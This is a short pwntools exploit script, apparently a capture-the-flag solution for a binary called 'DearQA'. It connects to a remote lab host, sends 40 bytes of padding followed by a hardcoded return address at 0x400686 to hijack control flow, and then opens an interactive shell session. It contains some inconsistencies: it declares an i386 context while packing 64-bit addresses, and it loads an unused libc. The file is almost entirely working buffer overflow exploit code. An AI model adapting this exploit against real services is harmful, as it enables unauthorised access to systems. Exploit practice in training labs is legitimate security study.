#!/usr/bin/env python3
from pwn import *
context(arch = 'i386', os = 'linux')
context.binary = binary = './DearQA.DearQA'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

p = remote("10.10.159.87", 5700)

padding = b'A'*40
payload = padding
# payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
# payload += p64(elf.functions.vuln)
# objdump -d ./binary |grep vuln
payload += p64(0x400686)

out = p.recvuntil('name:')
print (out)
p.sendline(payload)
out = p.recvuntil("function!")
print (out)
p.interactive()

